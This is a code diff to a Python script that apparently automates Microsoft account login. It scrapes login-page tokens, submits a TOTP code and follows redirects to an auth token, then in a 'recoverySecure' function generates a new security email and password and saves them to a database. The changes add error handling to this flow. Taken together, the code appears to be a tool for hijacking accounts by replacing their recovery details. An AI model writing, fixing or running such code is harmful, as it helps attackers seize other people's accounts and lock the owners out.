@@ -28,9 +28,17 @@ async def loginAuth(session: httpx.AsyncClient, email: str, data: dict, account:
         live_data["ppft"]
     )
 
-    sFT = re.search(r'"sFT":"([^"]+)"', pwd_login).group(1)
-    post_url: str = re.search(r'"urlPost":"(https://[^"]+)"', pwd_login).group(1)
-    proof_data: str = re.search(r'"arrUserProofs":\[.*?"data":"(\d+)".*?"type":(?:10|14)', pwd_login, re.DOTALL).group(1)
+    sFT_match = re.search(r'"sFT":"([^"]+)"', pwd_login)
+    post_url_match = re.search(r'"urlPost":"(https://[^"]+)"', pwd_login)
+    proof_match = re.search(r'"arrUserProofs":\[.*?"data":"(\d+)".*?"type":(?:10|14)', pwd_login, re.DOTALL)
+
+    if not sFT_match or not post_url_match or not proof_match:
+        return "invalid"
+
+    sFT = sFT_match.group(1)
+    post_url: str = post_url_match.group(1)
+    proof_data: str = proof_match.group(1)
+    tcode = await totp(secret)
 
     auth_post = await session.post(
         url = post_url,
@@ -39,7 +47,7 @@ async def loginAuth(session: httpx.AsyncClient, email: str, data: dict, account:
             "Content-Type": "application/x-www-form-urlencoded"
         },
         data = {
-            "otc": totp(secret),
+            "otc": tcode,
             "AddTD": "true",
             "SentProofIDE": proof_data,
             "GeneralVerify": "false",
@@ -53,10 +61,6 @@ async def loginAuth(session: httpx.AsyncClient, email: str, data: dict, account:
             "infoPageShown": "0"
         }
     )
-
-    urlPost = re.search(r'"urlPost"\s*:\s*"([^\"]+)"', auth_post.text)
-    if urlPost:
-        return None
 
     msaauth = await handleRedirects(session, auth_post.text)
     if not msaauth:
@@ -97,7 +101,7 @@ async def recoverySecure(email: str, type: str, data: dict) -> dict:
     sname = uuid.uuid4().hex[:16]
     password = uuid.uuid4().hex[:12]
 
-    type, security_email = await generateEmail(sname, password)
+    security_email = (await generateEmail(sname, password))[1]
     print(f"[+] - Generated Security Email ({security_email})")
 
     with DBConnection() as database:
